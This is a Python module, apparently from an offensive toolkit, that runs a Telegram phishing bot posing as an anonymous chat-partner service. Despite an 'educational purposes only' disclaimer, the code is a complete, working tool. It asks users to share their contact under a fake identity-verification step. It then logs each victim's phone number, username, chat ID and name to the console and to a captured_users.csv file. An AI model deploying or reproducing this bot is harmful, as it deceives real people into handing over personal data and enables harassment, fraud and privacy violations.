import telebot
from telebot import types
import csv
from ..shared_utils import Color

def phishing():
    """
    Demonstrates a social engineering scenario using a Telegram bot.
    This tool is for educational purposes to show how personal data can be requested.
    """
    print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Phishing Bot Demonstrator")
    print(f"{Color.YELLOW}Disclaimer: This tool is for educational purposes ONLY.")
    print(f"{Color.YELLOW}Do not use it for any malicious activities. The developers are not responsible for misuse.")

    try:
        token_bot = input(f'\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter Bot token to start: {Color.RESET}').strip()
        if not token_bot:
            print(f"{Color.RED}No token provided. Aborting.")
            return

        print(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Initializing bot...')
        bot = telebot.TeleBot(token_bot, threaded=False)
        bot.delete_webhook()
        # Check if token is valid by getting bot info
        bot.get_me()

    except Exception as e:
        print(f"{Color.RED}Failed to initialize Telegram Bot: {e}")
        print(f"{Color.RED}Please ensure your bot token is correct and you have an internet connection.")
        return

    print(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Bot is running... Press Ctrl+C to stop.')

    # In-memory storage for this demonstration
    waiting_users = []
    chatting_users = {}
    verified_users = set() # Use a set for faster lookups

    # --- Bot Handlers ---

    @bot.message_handler(commands=['start'])
    def start_handler(message):
        """Handles the /start command."""
        if message.chat.id in verified_users:
            bot.send_message(message.chat.id,
                             "👋 Welcome back! You are already verified. Send /search to find a chat partner.")
        else:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(text='✅ Verify Identity', callback_data='verify'))
            bot.send_message(message.chat.id, "👋 Welcome! Please verify your identity to begin.",
                             reply_markup=markup)

    @bot.callback_query_handler(func=lambda call: call.data == 'verify')
    def verify_handler(call):
        """Handles the 'verify' button press, asking for contact info."""
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        button_contact = types.KeyboardButton(text="📱 Share Contact to Verify", request_contact=True)
        markup.add(button_contact)
        bot.send_message(call.message.chat.id, "To verify, please share your contact information by pressing the button below.",
                         reply_markup=markup)

    @bot.message_handler(content_types=['contact'])
    def contact_handler(message):
        """Handles receiving a user's contact information."""
        if message.chat.id not in verified_users:
            verified_users.add(message.chat.id)
            user_info = {
                "phone": message.contact.phone_number,
                "chat_id": message.chat.id,
                "username": message.from_user.username,
                "first_name": message.from_user.first_name,
            }

            # Log the captured information to console and a file
            print(f'{Color.DARK_GRAY}[{Color.LIGHT_GREEN}✔{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Contact captured from @{user_info["username"]}: {user_info["phone"]}')
            try:
                with open('captured_users.csv', 'a', newline='', encoding='utf-8') as file:
                    writer = csv.DictWriter(file, fieldnames=user_info.keys())
                    if file.tell() == 0:
                        writer.writeheader()
                    writer.writerow(user_info)
            except IOError as e:
                print(f"{Color.RED}Could not write to captured_users.csv: {e}")

            bot.send_message(message.chat.id, "✅ Verification successful! You can now use the /search command.")

    @bot.message_handler(func=lambda message: message.chat.id in verified_users, content_types=['text'])
    def text_handler(message):
        """Handles text messages from verified users."""
        if message.text == '/search':
            if message.chat.id in chatting_users:
                bot.send_message(message.chat.id, "You are already in a chat. Send /stop to end it.")
                return

            waiting_users.append(message.chat.id)
            bot.send_message(message.chat.id, "⏳ Searching for a chat partner...")

            if len(waiting_users) >= 2:
                user1_id = waiting_users.pop(0)
                user2_id = waiting_users.pop(0)
                chatting_users[user1_id] = user2_id
                chatting_users[user2_id] = user1_id
                bot.send_message(user1_id, "🎉 Partner found! You can start talking.")
                bot.send_message(user2_id, "🎉 Partner found! You can start talking.")

        elif message.text == '/stop':
            if message.chat.id in chatting_users:
                partner_id = chatting_users.pop(message.chat.id)
                if partner_id in chatting_users:
                    del chatting_users[partner_id]
                bot.send_message(partner_id, "❌ Your partner has ended the chat.")
                bot.send_message(message.chat.id, "You have ended the chat.")
        else:
            if message.chat.id in chatting_users:
                partner_id = chatting_users[message.chat.id]
                bot.send_message(partner_id, message.text)

    @bot.message_handler(func=lambda message: message.chat.id not in verified_users)
    def unverified_handler(message):
        """Reminds unverified users to verify."""
        bot.send_message(message.chat.id, "❌ Please verify your identity first by sending /start.")

    try:
        bot.polling(non_stop=True)
    except Exception as e:
        print(f"{Color.RED}An error occurred while the bot was running: {e}")